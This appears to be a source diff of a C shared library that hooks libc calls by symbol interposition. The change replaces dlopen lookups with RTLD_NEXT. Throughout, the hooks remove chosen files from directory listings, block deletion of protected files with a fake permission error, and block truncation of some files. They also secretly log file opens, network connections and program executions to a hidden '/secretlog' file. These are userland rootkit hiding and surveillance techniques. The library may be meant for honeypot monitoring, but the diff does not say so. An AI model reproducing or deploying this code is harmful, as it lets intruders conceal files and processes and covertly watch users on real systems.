@@ -2,7 +2,6 @@
 #include <string.h>
 #include <sys/types.h>
 #include <errno.h>
-#include <dlfcn.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -12,6 +11,9 @@
 #define __USE_LARGEFILE64
 #include <dirent.h>
 #include <proc/readproc.h>
+
+#define __USE_GNU
+#include <dlfcn.h>
 
 #define LOG_FILE "/secretlog"
 /* Buffer for log string */
@@ -93,22 +95,10 @@ const char* my_addresses[] = {
 	"99.111.109.47"
 };
 
-void init() __attribute__((constructor));
-
-void init(){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	if(libc != NULL){
-		orig_fopen = dlsym(libc, "fopen");
-	}
-}
-
 /* appends the string s to the LOG_FILE */
 void mylog(const char* s){
 	FILE* log = NULL;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	if(libc != NULL){
-		orig_fopen = dlsym(libc, "fopen");
-	}
+	orig_fopen = dlsym(RTLD_NEXT, "fopen");
 	log = orig_fopen(LOG_FILE, "a+");
 	if(log == NULL) {
 		perror("file can't be open");
@@ -118,7 +108,6 @@ void mylog(const char* s){
 	time_t cur_time = time(0);
 	fprintf(log, "%s: %s\n", ctime(&cur_time), s);
 	fclose(log);
-	dlclose(libc);
 }
 
 int myaddr(const char* addr){
@@ -201,8 +190,7 @@ void logunlink(const char* filename){
 
 struct dirent *readdir(DIR *dirp){
 	struct dirent* dentry = NULL;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_readdir = dlsym(libc, "readdir");
+	orig_readdir = dlsym(RTLD_NEXT, "readdir");
 	dentry = (struct dirent*)orig_readdir(dirp);
 	while(dentry != NULL && is_invisible(dentry->d_name)){
 		dentry = (struct dirent*)orig_readdir(dirp);
@@ -211,14 +199,12 @@ struct dirent *readdir(DIR *dirp){
 	if(dentry != NULL)
 		logdentry(dentry);
 	
-	dlclose(libc);
 	return dentry;
 }
 
 struct dirent64 *readdir64(DIR *dirp){
 	struct dirent64* dentry = NULL;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_readdir64 = dlsym(libc, "readdir64");
+	orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
 	dentry = (struct dirent64*)orig_readdir64(dirp);
 	while(dentry != NULL && is_invisible(dentry->d_name)){
 		dentry = (struct dirent64*)orig_readdir64(dirp);
@@ -227,7 +213,6 @@ struct dirent64 *readdir64(DIR *dirp){
 	if(dentry != NULL)
 		logdentry64(dentry);
 	
-	dlclose(libc);
 	return dentry;
 }
 
@@ -236,11 +221,10 @@ int open(const char *pathname, int flags, mode_t mode){
 	if(is_onlyappend(pathname) && (flags & O_TRUNC) != 0)
 		return ret;
 
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_open = dlsym(libc, "open");
+	orig_open = dlsym(RTLD_NEXT, "open");
 	ret = orig_open(pathname, flags, mode);
 	logopen(pathname);
-	dlclose(libc);
+
 	return ret;
 }
 
@@ -249,10 +233,8 @@ FILE* fopen(const char* pathname, const char* mode){
 	if(is_onlyappend(pathname) && strchr(mode, 'w') != NULL)
 		return ret;
 
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_fopen = dlsym(libc, "fopen");
+	orig_fopen = dlsym(RTLD_NEXT, "fopen");
 	ret = orig_fopen(pathname, mode);
-	dlclose(libc);
 	logopen(pathname);
 	return ret;
 }
@@ -262,11 +244,9 @@ int open64(const char *pathname, int flags, mode_t mode){
 	if(is_onlyappend(pathname) && (flags & O_TRUNC) != 0)
 		return ret;
 
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_open64 = dlsym(libc, "open64");		
+	orig_open64 = dlsym(RTLD_NEXT, "open64");		
 	ret = orig_open64(pathname, flags, mode);
 	logopen(pathname);
-	dlclose(libc);
 	return ret;
 }
 
@@ -285,41 +265,35 @@ proc_t* readproc(PROCTAB *restrict const PT, proc_t *restrict p){
 
 int unlink(const char* pathname){
 	int ret = -1;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_unlink = dlsym(libc, "unlink");
+	orig_unlink = dlsym(RTLD_NEXT, "unlink");
 	if(!is_unremovable(pathname)){
 		ret = orig_unlink(pathname);
 	}
 	else
 		errno = EPERM;	
 	logunlink(pathname);
-	dlclose(libc);
 	return ret;
 }
 
 
 int unlinkat(int dirfd, const char *pathname, int flags){
 	int ret = -1;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_unlinkat = dlsym(libc, "unlinkat");
+	orig_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
 	if(!is_unremovable(pathname)){
 		ret = orig_unlinkat(dirfd, pathname, flags);
 	}
 	else
 		errno = EPERM;	
 	logunlink(pathname);	
-	dlclose(libc);
 	return ret;
 }
 
 int openat(int dirfd, const char *pathname, int flags, mode_t mode){
 	int ret = -1;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_openat = dlsym(libc, "openat");
+	orig_openat = dlsym(RTLD_NEXT, "openat");
 	if(is_onlyappend(pathname) && (flags & O_TRUNC) != 0)
 		return ret;
 
-	dlclose(libc);
 	return orig_openat(dirfd, pathname, flags, mode);
 }
 
@@ -334,64 +308,51 @@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
 	}	
 	snprintf(logstring, LOG_LENGTH, "connect to %s:%d\n", destaddr, htons(sa->sin_port));
 	mylog(logstring);
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_connect = dlsym(libc, "connect");
+	orig_connect = dlsym(RTLD_NEXT, "connect");
 	ret = orig_connect(sockfd, addr, addrlen);
-	dlclose(libc);
 	return ret;
 }
 
 
 int socket(int domain, int type, int protocol){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_socket = dlsym(libc, "socket");
+	orig_socket = dlsym(RTLD_NEXT, "socket");
 	int ret = orig_socket(domain, type, protocol);
 	if(ret != -1){
 		socket_info[(unsigned)ret] = domain;
 	}
-	dlclose(libc);
 	return ret;
 }
 
 FILE *freopen(const char *path, const char *mode, FILE *stream){
 	FILE *ret = NULL;
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_freopen = dlsym(libc, "freopen");
+	orig_freopen = dlsym(RTLD_NEXT, "freopen");
 	ret = orig_freopen(path, mode, stream);
-	dlclose(libc);
 	logopen(path);
 	return ret;
 }
 
 void logexec(const char* filename){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_snprintf = dlsym(libc, "snprintf");
+	orig_snprintf = dlsym(RTLD_NEXT, "snprintf");
 	orig_snprintf(logstring, LOG_LENGTH, "execve %s", filename);
 	mylog(logstring);
-	dlclose(libc);
 }
 	
 int execve(const char *filename, char *const argv[], char *const envp[]){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execve = dlsym(libc, "execve");
+	orig_execve = dlsym(RTLD_NEXT, "execve");
 	int ret = orig_execve(filename, argv, envp);
-	dlclose(libc);
 	logexec(filename);
 	return ret;
 }
 
 int execvp(const char *file, char *const argv[]){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execvp = dlsym(libc, "execvp");
+	orig_execvp = dlsym(RTLD_NEXT, "execvp");
 	int ret = orig_execvp(file, argv);
 	logexec(file);
-	dlclose(libc);
 	return ret;
 }
 
 int execl(const char *path, const char *arg, ...){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execl = dlsym(libc, "execl");
+	orig_execl = dlsym(RTLD_NEXT, "execl");
 	int i = 0; char *argp = NULL;
 	va_list vlist;
 	va_start(vlist, arg);
@@ -403,33 +364,26 @@ int execl(const char *path, const char *arg, ...){
 //	int ret = execlp(path, arg);
 //	int ret = orig_execl(path, arg);
 //	logexec(path);
-	dlclose(libc);
 	return ret;
 }	
 
 int execlp(const char *file, const char *arg, ...){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execlp = dlsym(libc, "execlp");
+	orig_execlp = dlsym(RTLD_NEXT, "execlp");
 	int ret = orig_execlp(file, arg);
 	logexec(file);
-	dlclose(libc);
 	return ret;
 }
 
 int execle(const char *path, const char *arg,...){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execle = dlsym(libc, "execle");
+	orig_execle = dlsym(RTLD_NEXT, "execle");
 	int ret = orig_execle(path, arg);
 	logexec(path);
-	dlclose(libc);
 	return ret;
 }
 
 int execv(const char *path, char *const argv[]){
-	void *libc = dlopen("libc.so.6", RTLD_NOW);	
-	orig_execv = dlsym(libc, "execv");
+	orig_execv = dlsym(RTLD_NEXT, "execv");
 	int ret = orig_execv(path, argv);
 	logexec(path);
-	dlclose(libc);
 	return ret;
 }
